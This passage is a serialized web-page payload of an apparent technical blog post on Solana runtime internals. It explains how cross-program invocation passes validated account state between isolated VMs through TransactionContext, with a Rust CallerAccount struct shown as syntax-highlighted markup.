token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                           \"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Thread-safe shared data buffer\"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    owner\"]}],[\"$\",\"span\",\"code-segement130\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement132\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[18]}],[\"$\",\"span\",\"code-segement136\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-36\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Handling CPI is somewhat similar to handling multiple \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Instructions\"}],\", so the same \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\" can be repurposed to pass information between programs.\"]}],\"\\n\",[\"$\",\"p\",\"p-37\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"On CPI calls / returns, we need to expose the latest account states from the invoking side to the receiving side of the CPI. Solana runtime does this by first validating the latest changes to the account and committing them into the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\", then passing the accounts in the \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\" into the other VM.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-8\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"CPI Call Process\"}],\"\\n\",[\"$\",\"p\",\"p-38\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"/blog/2025_06_27/cpi_call.png\",\"alt\":\"CPI Call\"}]}],\"\\n\",[\"$\",\"p\",\"p-39\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\" we described earlier lives on the host and serves as the bridge between two isolated VMs. When Program A calls Program B, each program runs in its own separate VM with isolated memory spaces, but they share account state through the host-side \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\". Here's what happens:\"]}],\"\\n\",[\"$\",\"h4\",\"h4-0\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 1: Instruction Crafting\"}],\"\\n\",[\"$\",\"p\",\"p-40\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Program A constructs a CPI instruction specifying the callee's program ID and metadata of accounts involved. This includes each account's address, whether the account's owner has signed the instruction, and whether the account should be writable.\"}],\"\\n\",[\"$\",\"h4\",\"h4-1\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 2: Load Account Data\"}],\"\\n\",[\"$\",\"p\",\"p-41\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The runtime creates \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"CallerAccount\"}],\" structures by resolving \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountInfo\"}],\" structures from Program A's VM memory. These \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"CallerAccount\"}],\" structures hold mutable references pointing directly into Program A's serialized account data, and will be used later during CPI return to efficiently update the caller's state.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-5\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Resolved view of AccountInfo with direct field access\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    lamports\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                  \"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Direct mutable reference to lamports\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    owner\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                  \"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Direct mutable reference to owner\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    original_data_len\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"usize\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"               \"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Track size changes for realloc handling\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    serialized_data\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Points to serialized data in VM\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    vm_data_addr\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                      \"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// VM address of AccountInfo.data pointer\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    ref_to_len_in_vm\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// VM address of AccountInfo.data length\"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    serialized_len_ptr\"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    executable\"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    rent_epoch\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-42\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"When Program B finishes execution, the runtime uses these mutable references to directly update Program A's VM memory without additional lookup.\"}],\"\\n\",[\"$\",\"h4\",\"h4-2\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 3: Validation and Cache Update\"}],\"\\n\",[\"$\",\"p\",\"p-43\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Before handing control to Program B, the runtime validates everything Program A has done so far, similar to the validation phase in single program execution. Only after validation passes are Program A's changes written to the shared cache. This ensures that the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" always holds valid account state, so each program in the call chain sees only validated changes from previous programs.\"]}],\"\\n\",[\"$\",\"h4\",\"h4-3\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 4: Serialization to Callee VM\"}],\"\\n\",[\"$\",\"p\",\"p-44\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Program B gets its own fresh VM with a new \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" region. All account data from the shared cache gets serialized and copied into Program B's \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" region, just like in single program execution. Program B can now run normally, seeing the same \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountInfo\"}],\" structures as if it were called directly.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-9\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"CPI Return Process\"}],\"\\n\",[\"$\",\"p\",\"p-45\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"/blog/2025_06_27/cpi_return.png\",\"alt\":\"CPI Return\"}]}],\"\\n\",[\"$\",\"p\",\"p-46\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"When Program B finishes execution, the runtime must ensure all changes from Program B are valid before merging them back to Program A. Here's what happens:\"}],\"\\n\",[\"$\",\"h4\",\"h4-4\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 1: Validation and Cache Update\"}],\"\\n\",[\"$\",\"p\",\"p-47\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Program B's VM states are revalidated using the same rules as single program execution. This prevents Program B from violating ownership rules, stealing funds, or modifying read-only accounts. Only validated changes are written back to the shared cache, again, ensuring \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border 